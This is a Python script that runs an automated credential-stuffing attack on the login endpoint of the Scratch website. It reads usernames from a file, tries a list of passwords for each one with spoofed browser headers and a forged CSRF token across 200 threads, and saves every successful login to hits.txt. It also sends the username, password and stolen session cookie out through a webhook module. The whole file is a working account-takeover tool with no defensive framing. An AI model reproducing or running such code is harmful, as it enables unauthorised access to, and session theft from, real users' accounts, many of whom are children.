import webhooks
from concurrent.futures import ThreadPoolExecutor
import requests

_users = open('users.txt', 'r').read().splitlines()
users = []

for pos,user in enumerate(_users):
    users.append((user,pos))

users_length = len(users)

cookies = {
    'permissions': '%7B%7D',
    'scratchcsrftoken': 'a',
}

headers = {
    'accept': 'application/json',
    'accept-language': 'en-GB,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://scratch.mit.edu',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://scratch.mit.edu/',
    'sec-ch-ua': '"Brave";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'x-csrftoken': 'a',
    'x-requested-with': 'XMLHttpRequest',
}

hits = []

def attempt(user: str):
    pos = f"{user[1]}/{users_length}"
    passlist = {
        "password 1",
        "password 2",
        "password 3",
        "password 4"
    }
    try:
        print(f"{pos} | trying {user[0]}")
        for password in passlist:
            json_data = {
                'username': user[0],
                'password': password,
                'useMessages': True,
            }

            response = requests.post("https://scratch.mit.edu/accounts/login/", cookies=cookies, headers=headers, json=json_data, timeout=15)
            print(f"{pos} | {user[0]}: {response.status_code}")
            if response.status_code == 200:
                hits.append(f"{user[0]},{password}")
                try:
                    sid = response.headers["Set-Cookie"].split('"')[1]
                    webhooks.send_succ(user[0], password, sid)
                except:
                    pass
    except Exception:
        pass
    else:
        print(f"{pos} | finished {user[0]}")

with ThreadPoolExecutor(max_workers=200) as executor:
    executor.map(attempt, users)

with open("hits.txt", "a") as file:
    for hit in hits:
        file.write(f"{hit}\n")
